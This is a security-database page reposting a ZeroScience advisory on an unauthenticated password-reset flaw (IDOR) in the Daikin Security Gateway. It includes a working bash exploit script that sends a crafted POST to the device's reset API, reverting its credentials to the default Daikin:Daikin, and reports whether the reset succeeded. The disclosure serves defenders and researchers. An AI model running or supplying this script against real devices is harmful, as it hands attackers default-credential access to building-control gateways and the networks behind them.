---
title: Daikin Security Gateway  14 Remote Password Reset
url: https://cxsecurity.com/issue/WLB-2025050010
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-05-04
fetch_date: 2025-10-06T22:23:52.019849
---

# Daikin Security Gateway  14 Remote Password Reset

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Daikin Security Gateway 14 Remote Password Reset** **2025.05.03**  Credit:  **[Gjoko 'LiquidWorm' Krstic](https://cxsecurity.com/author/Gjoko%2B%26%23039%3BLiquidWorm%26%23039%3B%2BKrstic/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Daikin Security Gateway 214 - Remote Password Reset
# Vendor: Daikin Industries, Ltd.
# Product web page: https://www.daikin.com
# https://www.daikin.eu/en\_us/products/product.html/DRGATEWAYAA.html
# Affected version: App: 100, Frm: 214
#
# Summary: The Security gateway allows the iTM and LC8 controllers
# to connect through the Security gateway to the Daikin Cloud Service.
# Instead of sending the report to the router directly, the iTM or
# LC8 controller sends the report to the Security gateway first. The
# Security gateway transforms the report format from http to https
# and then sends the transformed https report to the Daikin Cloud
# Service via the router. Built-in LAN adapter enabling online control.
#
# Desc: The Daikin Security Gateway exposes a critical vulnerability
# in its password reset API endpoint. Due to an IDOR flaw, an unauthenticated
# attacker can send a crafted POST request to this endpoint, bypassing
# authentication mechanisms. Successful exploitation resets the system
# credentials to the default Daikin:Daikin username and password combination.
# This allows attackers to gain unauthorized access to the system without
# prior credentials, potentially compromising connected devices and networks.
#
# Tested on: fasthttp
#
#
# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
# @zeroscience
#
#
# Advisory ID: ZSL-2025-5931
# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2025-5931.php
#
#
# 21.03.2025
#
[ $# -ne 1 ] && { echo "Usage: $0 <target\_ip>"; exit 1; }
TARGET\_IP="$1"
URL="https://$TARGET\_IP/api/settings/password/reset"
PAYLOAD="t00t"
[[ ! $TARGET\_IP =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]] && { echo "Bad IP."; exit 1; }
RESPONSE=$(curl -kX POST "$URL" -H "Content-type: application/json" -d "$PAYLOAD" 2>/dev/null)
[ $? -ne 0 ] && { echo "Can’t reach $TARGET\_IP."; exit 1; }
if [[ $RESPONSE =~ \"Error\":0 ]]; then
echo "Reset worked! Vulnerable."
elif [[ $RESPONSE =~ \"Error\":1 ]]; then
echo "Not vulnerable."
else
echo "Got: $RESPONSE"
fi

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025050010)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top